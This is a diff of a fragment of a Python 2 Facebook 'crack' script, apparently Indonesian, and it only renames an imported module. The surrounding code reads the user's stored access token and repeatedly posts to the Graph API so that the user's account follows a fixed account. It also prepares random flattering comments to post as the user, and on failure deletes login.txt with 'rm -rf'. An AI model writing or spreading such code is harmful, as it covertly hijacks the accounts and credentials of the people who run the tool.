@@ -1,5 +1,5 @@
 #coding=utf-8
-import requests, sys, os, random, orbxd
+import requests, sys, os, random, prem
 from requests.exceptions import ConnectionError
 komenredem = random.choice(['Bang Lu Ngntd!', 'Bang Lu Cakep Tapi Sayang Kaya Kntl', 'Siang Luting Malam Jadi Kang Ghosting', 'Dah Lah Abng Cakep Banget :) ', 'Siang Panen Pahala Malam Panen Kepala', 'Arigato Atas Scnya Bang', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Semoga Abang Sukses', 'Gua Pengguna Sc cr4ck Lu Bang ', 'Wih Panutan Gua Nih', 'Senseii Kawaiine'])
 komtwol = random.choice(['Salam 2 Jari Bang', 'Mantap Sensei', 'bang lu kgk punya pacar?', 'MengKeren Lah Bang', 'Semangat Bang!', 'Gua Murid Lu Bang', 'Tumben Post Bang?', 'Gua Pengin Jadi Kek Abang', 'Semoga Abang Jadi Orang Sukses', 'Bjir Lawack Kali Kau Bang'])
@@ -10,7 +10,7 @@ def dekudesu():
     except IOError:
         print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie invalid'
         os.system('rm -rf login.txt')
-        exit(orbxd.login())
+        exit(prem.login())
     kom = komenredem
     komentar = komtwol
     yotsuba = kartu2d
@@ -24,4 +24,4 @@ def dekudesu():
     requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + token) #mey
     requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + token)#mieruko chan
     requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + token) #tsukasa chan
-    exit(orbxd.menu())
+    exit(prem.menu())
